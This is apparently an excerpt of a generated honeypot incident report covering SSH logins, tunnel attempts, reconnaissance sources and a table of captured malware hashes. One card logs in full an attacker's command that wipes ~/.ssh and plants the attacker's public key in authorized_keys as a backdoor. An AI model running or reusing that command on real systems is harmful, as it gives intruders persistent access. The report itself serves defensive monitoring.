| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-19 08:40 |
| **Last Seen** | 2026-08-19 08:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:40:21` | `cowrie.session.connect` |
| `2026-08-19 08:40:21` | `cowrie.client.version` |
| `2026-08-19 08:40:21` | `cowrie.client.kex` |
| `2026-08-19 08:40:22` | `cowrie.login.success` |
| `2026-08-19 08:40:23` | `cowrie.session.params` |
| `2026-08-19 08:40:23` | `cowrie.command.input` |
| `2026-08-19 08:40:23` | `cowrie.command.failed` |
| `2026-08-19 08:40:24` | `cowrie.log.closed` |
| `2026-08-19 08:40:25` | `cowrie.session.params` |
| `2026-08-19 08:40:25` | `cowrie.command.input` |
| `2026-08-19 08:40:25` | `cowrie.session.file_download` |
| `2026-08-19 08:40:25` | `cowrie.log.closed` |
| `2026-08-19 08:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2ca65ff714d

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-19 08:40 |
| **Last Seen** | 2026-08-19 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:40:25` | `cowrie.session.connect` |
| `2026-08-19 08:40:25` | `cowrie.client.version` |
| `2026-08-19 08:40:25` | `cowrie.client.kex` |
| `2026-08-19 08:40:26` | `cowrie.login.success` |
| `2026-08-19 08:40:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87be65d8407

| Field | Detail |
|---|---|
| **Source IP** | `159.65.2[.]17` |
| **First Seen** | 2026-08-19 08:40 |
| **Last Seen** | 2026-08-19 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:40:27` | `cowrie.session.connect` |
| `2026-08-19 08:40:27` | `cowrie.client.version` |
| `2026-08-19 08:40:27` | `cowrie.client.kex` |
| `2026-08-19 08:40:28` | `cowrie.login.success` |
| `2026-08-19 08:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.65.2[.]17` to AbuseIPDB if not already reported
- [ ] Block `159.65.2[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d8a3ecc5f0

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]220` |
| **First Seen** | 2026-08-19 08:40 |
| **Last Seen** | 2026-08-19 08:40 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:40:49` | `cowrie.session.connect` |
| `2026-08-19 08:40:50` | `cowrie.client.version` |
| `2026-08-19 08:40:50` | `cowrie.client.kex` |
| `2026-08-19 08:40:53` | `cowrie.login.success` |
| `2026-08-19 08:40:53` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]220` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5f827e7409

| Field | Detail |
|---|---|
| **Source IP** | `209.173.10[.]75` |
| **First Seen** | 2026-08-19 08:40 |
| **Last Seen** | 2026-08-19 08:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:40:59` | `cowrie.session.connect` |
| `2026-08-19 08:41:01` | `cowrie.client.version` |
| `2026-08-19 08:41:01` | `cowrie.client.kex` |
| `2026-08-19 08:41:06` | `cowrie.login.success` |
| `2026-08-19 08:41:07` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.173.10[.]75` to AbuseIPDB if not already reported
- [ ] Block `209.173.10[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4d9654f2605

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:44 |
| **Last Seen** | 2026-08-19 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:44:22` | `cowrie.session.connect` |
| `2026-08-19 08:44:22` | `cowrie.client.version` |
| `2026-08-19 08:44:22` | `cowrie.client.kex` |
| `2026-08-19 08:44:23` | `cowrie.login.success` |
| `2026-08-19 08:44:23` | `cowrie.session.params` |
| `2026-08-19 08:44:23` | `cowrie.command.input` |
| `2026-08-19 08:44:24` | `cowrie.log.closed` |
| `2026-08-19 08:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81d74dab6fd7

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 08:45 |
| **Last Seen** | 2026-08-19 08:45 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:45:28` | `cowrie.session.connect` |
| `2026-08-19 08:45:30` | `cowrie.client.version` |
| `2026-08-19 08:45:30` | `cowrie.client.kex` |
| `2026-08-19 08:45:37` | `cowrie.login.success` |
| `2026-08-19 08:45:40` | `cowrie.session.params` |
| `2026-08-19 08:45:40` | `cowrie.command.input` |
| `2026-08-19 08:45:43` | `cowrie.log.closed` |
| `2026-08-19 08:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d779c1d3b5e8

| Field | Detail |
|---|---|
| **Source IP** | `114.30.223[.]119` |
| **First Seen** | 2026-08-19 08:45 |
| **Last Seen** | 2026-08-19 08:46 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:45:51` | `cowrie.session.connect` |
| `2026-08-19 08:45:52` | `cowrie.client.version` |
| `2026-08-19 08:45:52` | `cowrie.client.kex` |
| `2026-08-19 08:45:55` | `cowrie.login.success` |
| `2026-08-19 08:45:56` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.223[.]119` to AbuseIPDB if not already reported
- [ ] Block `114.30.223[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd87a7955723

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-19 08:46 |
| **Last Seen** | 2026-08-19 08:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:46:02` | `cowrie.session.connect` |
| `2026-08-19 08:46:03` | `cowrie.client.version` |
| `2026-08-19 08:46:03` | `cowrie.client.kex` |
| `2026-08-19 08:46:05` | `cowrie.login.success` |
| `2026-08-19 08:46:05` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:46:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a320808e0942

| Field | Detail |
|---|---|
| **Source IP** | `210.177.143[.]61` |
| **First Seen** | 2026-08-19 08:46 |
| **Last Seen** | 2026-08-19 08:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:46:07` | `cowrie.session.connect` |
| `2026-08-19 08:46:08` | `cowrie.client.version` |
| `2026-08-19 08:46:08` | `cowrie.client.kex` |
| `2026-08-19 08:46:10` | `cowrie.login.success` |
| `2026-08-19 08:46:11` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.177.143[.]61` to AbuseIPDB if not already reported
- [ ] Block `210.177.143[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0227c8592894

| Field | Detail |
|---|---|
| **Source IP** | `65.20.175[.]6` |
| **First Seen** | 2026-08-19 08:46 |
| **Last Seen** | 2026-08-19 08:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:46:19` | `cowrie.session.connect` |
| `2026-08-19 08:46:21` | `cowrie.client.version` |
| `2026-08-19 08:46:21` | `cowrie.client.kex` |
| `2026-08-19 08:46:26` | `cowrie.login.success` |
| `2026-08-19 08:46:29` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.175[.]6` to AbuseIPDB if not already reported
- [ ] Block `65.20.175[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d69fffecb3ca

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-08-19 08:48 |
| **Last Seen** | 2026-08-19 08:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:48:44` | `cowrie.session.connect` |
| `2026-08-19 08:48:45` | `cowrie.client.version` |
| `2026-08-19 08:48:45` | `cowrie.client.kex` |
| `2026-08-19 08:48:46` | `cowrie.login.success` |
| `2026-08-19 08:48:46` | `cowrie.direct-tcpip.request` |
| `2026-08-19 08:48:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe41cda82871

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 08:50 |
| **Last Seen** | 2026-08-19 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 08:50:19` | `cowrie.session.connect` |
| `2026-08-19 08:50:19` | `cowrie.client.version` |
| `2026-08-19 08:50:19` | `cowrie.client.kex` |
| `2026-08-19 08:50:19` | `cowrie.login.success` |
| `2026-08-19 08:50:20` | `cowrie.session.params` |
| `2026-08-19 08:50:20` | `cowrie.command.input` |
| `2026-08-19 08:50:20` | `cowrie.log.closed` |
| `2026-08-19 08:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `80.251.153[.]178` | **667** | 2026-08-19 06:55 | 2026-08-19 08:54 | 794m | 0 | `T1592` | 🟠 MEDIUM |
| `123.118.1[.]169` | **5** | 2026-08-19 07:00 | 2026-08-19 07:01 | 4m | 0 | `T1592` | 🟢 LOW |
| `118.193.59[.]194` | **4** | 2026-08-19 07:01 | 2026-08-19 07:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-08-19 07:28 | 2026-08-19 08:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]189` | **3** | 2026-08-19 08:48 | 2026-08-19 08:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]46` | **3** | 2026-08-19 07:52 | 2026-08-19 07:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]107` | **3** | 2026-08-19 08:48 | 2026-08-19 08:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]45` | **3** | 2026-08-19 07:52 | 2026-08-19 07:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]50` | **3** | 2026-08-19 07:52 | 2026-08-19 07:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]235` | **3** | 2026-08-19 08:49 | 2026-08-19 08:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.15.238[.]36` | **2** | 2026-08-19 07:24 | 2026-08-19 07:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-08-19 08:34 | 2026-08-19 08:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | **2** | 2026-08-19 06:55 | 2026-08-19 06:56 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.59.173[.]98` | 1 | 2026-08-19 07:09 | 2026-08-19 07:10 | 30s | 0 | `T1592` | 🟢 LOW |
| `167.71.102[.]181` | 1 | 2026-08-19 07:09 | 2026-08-19 07:09 | 8s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]134` | 1 | 2026-08-19 07:55 | 2026-08-19 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.75[.]82` | 1 | 2026-08-19 08:35 | 2026-08-19 08:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.244.197[.]22` | 1 | 2026-08-19 07:50 | 2026-08-19 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-08-19 07:13 | 2026-08-19 07:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.75.225[.]206` | 1 | 2026-08-19 07:20 | 2026-08-19 07:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-19 07:02 | 2026-08-19 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-08-19 07:37 | 2026-08-19 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-08-19 08:35 | 2026-08-19 08:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-19 07:37 | 2026-08-19 07:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.77.69[.]201` | 1 | 2026-08-19 07:20 | 2026-08-19 07:20 | 9s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]234` | 1 | 2026-08-19 07:20 | 2026-08-19 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-08-19 08:35 | 2026-08-19 08:35 | 5s | 0 | `T1592` | 🟢 LOW |
| `83.226.56[.]106` | 1 | 2026-08-19 08:48 | 2026-08-19 08:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | 1 | 2026-08-19 08:31 | 2026-08-19 08:32 | 76s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
